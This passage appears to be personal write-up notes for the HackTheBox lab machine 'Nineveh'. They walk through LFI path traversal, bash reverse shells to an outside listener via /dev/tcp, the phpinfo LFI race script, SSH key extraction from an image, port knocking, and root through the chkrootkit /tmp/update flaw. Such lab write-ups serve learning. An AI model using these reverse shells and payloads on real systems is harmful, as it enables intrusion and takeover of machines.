	/ninevehNotes/../etc/passwd

Shell as www-data (via LFI)
----------------------------
- url encode the payload

	http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../var/tmp/lord.php&cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.54/9001 0>%261'

- start a listener with netcat

	nc -nlvp 9001

- we got a shell as www-data

Shell as www-data (via phpinfo.php)
-----------------------------------
- if the php is configured with file_uploads = on we can use that along with the LFI vulnerability to get RFI
- Insomnia provides a Python script that will exploit this
- we can download it anf get it working 
- setup the ip, port, phpsessid and other necessary changes to match nineveh
	
	- change the payload to include a reverse shell
	- change the REQ1 to /info.php
	- change the POST path in LFIREQ to nineveh LFI
	- added PHPSESSID cookie to the LFIREQ

- with all these changes in place we can start a netcat listener and run the script 

	nc -lnvp 9002
	python phpinfolfi.py 10.10.10.43 80 100

- we got a shell as wwww-data

Shell as amrois
---------------
- without having much to work with we can revisit the images we found on the site earlier 
- checking the image file in /secure_notes with binwalk

	binwalk nineveh.png

- it says that there is a Zlib compressed data hidden inside the image
- we can try to extract all the files with the -e flag 

	binwalk -e nineveh.png

- within the extracted files we have a SSH private key and public key for nineveh machine 
- the public key gimes a username amrois
- on trying to SSH with the ssh key file we noticed that there is no port 22 open on the machine   
- we might have a port knocking situation on our hands 
- we can enumerate the box as www-data further to get an idea on this situation
- checking on the running processes

	ps auxww

- we found knockd running which is a daemon for port knocking 
- knockd will set the firewall rules for hitting certain ports in a specific order onorder to open a filtered port
- we can check /etc/knockd.conf file for the ports which needs to be knocked in order
	
	[openSSH]
 	sequence = 571, 290, 911
 	seq_timeout = 5

- when we hit ports 571 290 and 911 in sync within 5 seconds, it will add a rule to allow our ip to get to port 22
- we can do this using nmap
	
	for i in 571 290 911; do nmap -Pn -p $i --host_timeout 201 --max-retries 0 10.10.10.43; done

- now if we run a scan against port 22 on the machine we will see it as open

	nmap -p 22 10.10.10.43

- now that we have port 22 open we can try ssh into the machine with the ssh key we found 
	
	ssh -i id_rsa_nineveh_amrois amrois@10.10.10.43 

- and we are in 
- grab the user flag

Priv-esc
--------
- on checking around the file system we found an unusual directory called /report in the system root directory
- on inspecting it we found files which were dated fairly recent
- which means that there might be some kind of cronjob at play doing this on the machine 
- we ran pspy and found many processes running every minute referencing the /usr/bin/chkrootkit which is tool used to check for signs of rootkits on the machine 
- we can check for any known exploits for chkrootkit in searchsploit 

	searchsploit chkrootkit

- we found one and its says that any file in $SLAPPER_FILES will run due to a typo in the code
- the code of SLAPPER_FILES is as follows 

	SLAPPER_FILES="${ROOTDIR}tmp/.bugtraq ${ROOTDIR}tmp/.bugtraq.c"
   	SLAPPER_FILES="$SLAPPER_FILES ${ROOTDIR}tmp/.unlock ${ROOTDIR}tmp/httpd \
   	${ROOTDIR}tmp/update ${ROOTDIR}tmp/.cinik ${ROOTDIR}tmp/.b"a

 - we can add a reverse shell to the /tmp/update and make it executable

 	echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.54/9003 0>&1'
#!/bin/bash
	chmod +x /tmp/update

- start a netcat listener

	nc -nlvp 9003

- the next time chkrootkit runs we will get a reverse shell 
- in a few minutes we got a shell as root 
- grab the root flag
